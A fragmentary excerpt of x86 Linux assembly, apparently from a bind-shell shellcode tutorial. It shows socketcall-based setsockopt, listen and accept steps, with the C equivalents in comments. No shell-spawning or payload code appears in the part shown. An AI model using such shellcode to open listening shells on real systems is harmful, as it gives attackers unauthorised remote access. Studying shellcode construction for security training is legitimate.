...
sys_setsocopt:
	...
	; pushing the sys_setsocopt arguments in reverse order (sock, SOL_SOCKET, SO_REUSEADDR, &socklen_t, socklen_t)
...
sys_listen:
	; {C code} --> listen(sock,0);
	
	; syscall definition
	mov al, 102			; syscall - socketcall
	mov bl, 4			; socketcall type - sys_listen

	; pushing the sys_listen arguments in reverse order (int sock, int backlog)
	xor esi,esi		
...
sys_accept:
	; {C code} --> int new_sock = accept(sock,NULL,NULL);
	
	; syscall definition
	mov al, 102			; syscall - socketcall
	mov bl, 5			; socketcall type - sys_accept
	
	; pushing the sys_accept arguments in reverse order (int sockfd, struct sockaddr *addr, socklen_t *addrlen)
	xor esi, esi
